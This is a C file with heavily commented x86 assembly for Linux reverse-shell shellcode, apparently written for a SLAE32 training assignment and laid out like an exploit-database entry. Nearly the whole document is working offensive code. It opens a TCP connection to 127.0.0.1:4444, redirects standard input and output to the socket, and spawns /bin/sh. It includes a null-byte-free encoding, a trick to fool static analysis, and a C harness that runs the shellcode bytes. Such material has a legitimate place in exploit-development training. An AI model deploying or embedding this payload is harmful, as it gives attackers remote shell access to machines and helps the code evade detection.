/*
; name       : Exploit Title: Linux/x86 - TCP reverse shell 127.0.0.1 nullbyte free
; date       : 04th sept, 2019
; author     : Sandro "guly" Zaccarini
; twitter    : @theguly
; blog       : https://gulyslae.github.io/
; SLAE32     : SLAE-1037
; purpose    : the program will create a new connection to 127.0.0.1:4444 and spawns a shell
;              this code has been written as extramile for SLAE32 assignment 2
; license    : CC-BY-NC-SA

  global _start
    section .text

      _start:
      ; start by zeroing eax,ebx. not really needed because registers are clean, but better safe than sorry
      xor eax,eax
      xor ebx,ebx

      ; ----------------------------------------------------------------------------------------
      ; purpose     : create a socket
      ; references  : man socket
      ; description :
      ; socketcall is the syscall used to work with socket. i'm going to use this syscall to create and connect
      ; the very first thing i have to do, is to create the socket itself. by reading references, i see that she needs 3 registers:
      ; eax => syscall id 0x66 for socketcall, that will be the same for every socketcall call of course and that's why i created a function on top
      ; ebx => socket call id, that is 0x1 for socket creation
      ; ecx => pointer to socket args
      ;
      ; man socket shows me that socket's args are:
      ; domain   => AF_INET because i'm creating a inet socket, and is 0x2
      ; type     => tcp is referenced as STREAM, that is 0x1
      ; protocol => unneded here because there is no inner protocol, so i'll use 0x0

      ; not, i'm creating ecx because a zeroed eax is perfect for the purpose
      ; arg will be pushed in reverse order with no hardcoded address: 0, 1, 2
      push eax
      inc eax
      push eax
      inc eax
      push eax

      ; because socketcall needs a pointer, i'm moving esp address to ecx
      mov ecx,esp

      ; prepare eax to hold the socketcall value as discussed before. i'm not hardcoding 0x66 to (try to) fool some static analysis: 0x33 is sysacct and looks harmless to me
      mov al,0x33
      add al,0x33

      ; because ebx has been zeroed, i can just inc to have it to 1 for socketcall to call socket (pun intended :) )
      inc ebx

      ; do the call and create socket
      int 0x80

      ; because syscall rets to eax, if everything's good, eax will hold socket file descriptor: save it to esi to store it safe for the whole run
      mov esi,eax

      ; ----------------------------------------------------------------------------------------
      ; purpose     : connect to raddr:rport
      ; references  : man connect , man 7 ip
      ; description :
      ; eax => syscall id 0x66 for socketcall
      ; ebx => connect call id, 0x3 taken from linux/net.h
      ; ecx => pointer to address struct
      ;
      ; man connect shows me that args are:
      ; sockfd  => already saved in esi
      ; address => pointer to ip struct
      ; addrlen => addrlen is 32bit (0x10)
      ;
      ; man 7 ip shows address struct details. arguments are:
      ; family => AF_INET, so 0x2
; port   => hardcoded 4444
; addr   => 127.0.0.1

; zero again
xor eax,eax

; push arg in reverse and move the pointer to ecx
; prepare stack pointer to addr struct defined in man 7 ip
; as exercise, i'm going to use 127.0.0.1 as remote address, because it contains null bytes
; hex value of 127.0.0.1 is 0x0100007f
; pushing 0x00000000 to esp by using a known null register. i've also could used sub esp,0x8 because i have enough room, or mov eax,[esp] or another zillion of similal instructions
push eax
mov byte [esp], 0x7f
; now esp is: 0x0000007f
mov byte [esp+3],0x01
; now esp is: 0x0100007f

; push port to bind to, 4444 in hex, to adhere to msf defaults :)
push word 0x5c11
; push AF_INET value as word again
inc ebx
push word bx
; get stack pointer to ecx
mov ecx,esp

; same call to have 0x66 to eax and do socketcall
mov al,0x33
add al,0x33

; push arg, again in reverse order
push eax
; pointer to addr struct
push ecx
; sockfd, saved before to esi
push esi
; stack pointer to ecx again, to feed bind socketcall
mov ecx,esp

; ebx is 0x2, i need 0x3
inc ebx

; do the call
int 0x80

; ----------------------------------------------------------------------------------------
; purpose     : create fd used by /bin//sh
; references  : man dup2
; description : every shell has three file descriptor: STDIN(0), STDOUT(1), STDERR(2)
; this code will create said fd
; eax => 0x3f
; ebx => clientid
; ecx => newfd id, said file descriptor
;
; i'm going to create them by looping using ecx, to save some instruction. ecx will start at 2, then is dec and fd is created.
; as soon as ecx is 0, the loop ends


; i'm using a different method from one i've used for bindshell just to try.
; i'll put 0x3 to ecx to start creating STDERR just after dec
; ecx is dirty but edx is 0x0, just swap them
; edit: actually, running from a C code you'll have edx dirty. zero it...
xor edx,edx
xchg ecx,edx
mov cl,0x3

; copy socket fd to ebx to feed clientid
mov ebx,esi

; zero eax and start the loop
xor eax,eax

; dup2 call id
mov al,0x3f
; dec ecx to have 2,1,0
dec ecx
int 0x80

mov al,0x3f
; dec ecx to have 2,1,0
dec ecx
int 0x80

mov al,0x3f
; dec ecx to have 2,1,0
dec ecx
int 0x80

; ----------------------------------------------------------------------------------------
; purpose     : spawn /bin//sh
; references  : man execve
; description : put /bin//sh on the stack, aligned to 8 bytes to prevent 0x00 in the shellcode itself
; and null terminating it by pushing a zeroed register at first
; eax => execve call, 0xB
; ebx => pointer to executed string, which will be /bin//sh null terminated
; ecx => pointer to args to executed command, that could be 0x0
; edx => pointer to environment, which could be 0x0
;
; i need to push a null byte to terminate the string, i know ecx is 0x0 so i can save one op
push ecx
push 0x68732f2f
push 0x6e69622f
; here the stack will looks like a null terminated /bin/sh:
; /bin//sh\0\0\0\0\0\0\0\0

; and place pointer to ebx
mov ebx,esp

; envp to edx and ecx
push ecx
mov edx,esp
push ecx
mov ecx,esp

; execve syscall here
mov al,0xB

; and pop shell
int 0x80

; neat exit
xor eax,eax
mov al,0x1
int 0x80

*/

#include <stdio.h>
#include <string.h>

unsigned char buf[] = "\x31\xc0\x31\xdb\x50\x40\x50\x40\x50\x89\xe1\xb0\x33\x04\x33\x43\xcd\x80\x89\xc6\x31\xc0\x50\xc6\x04\x24\x7f\xc6\x44\x24\x03\x01\x66\x68\x11\x5c\x43\x66\x53\x89\xe1\xb0\x33\x04\x33\x50\x51\x56\x89\xe1\x43\xcd\x80\x31\xd2\x87\xca\xb1\x03\x89\xf3\x31\xc0\xb0\x3f\x49\xcd\x80\xb0\x3f\x49\xcd\x80\xb0\x3f\x49\xcd\x80\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x51\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";


void main() {
  printf("Shellcode Length:  %d\n", strlen(buf));
  int (*ret)() = (int(*)())buf;
  ret();
}